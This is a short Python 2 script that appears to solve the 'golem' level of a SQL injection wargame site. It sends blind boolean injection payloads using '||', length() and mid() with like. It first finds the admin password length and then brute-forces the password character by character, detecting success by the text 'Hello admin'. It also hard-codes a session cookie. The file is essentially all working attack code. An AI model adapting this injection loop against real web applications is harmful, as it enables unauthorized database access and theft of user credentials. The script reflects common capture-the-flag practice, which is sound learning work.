#-*- coding: utf-8 -*-
import urllib2, urllib, string

def getRequest(url, inject_url=""):
    if inject_url is not "": url = url.format(urllib.quote(inject_url))
    print url
    req = urllib2.Request(url)
    req.add_header('User-Agent','Mozilla/4.0')
    req.add_header("Cookie","PHPSESSID=kvkemdvcf9bqkcmk5v2c51chk4")
    return req

def getPage(req):
    return urllib2.urlopen(req).read()

url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw={}"

# get length
inject_url = "' || length(pw) like {}; -- -"
for i in range(1, 100):
    req = getRequest(url,inject_url.format(i))
    page = getPage(req)
    if "Hello admin" in page:
        length = i
        break

print "Length :",length

# get password : brute forcing
password = ""
inject_url = "' || mid(pw,{},1) like '{}"
for i in range(1,length+1):
    for c in string.digits + string.letters:
        req = getRequest(url, inject_url.format(i,c))
        page = getPage(req)
        if "Hello admin" in page:
            print i,"'th letter is",c
            password += c
            break

print "Password :",password
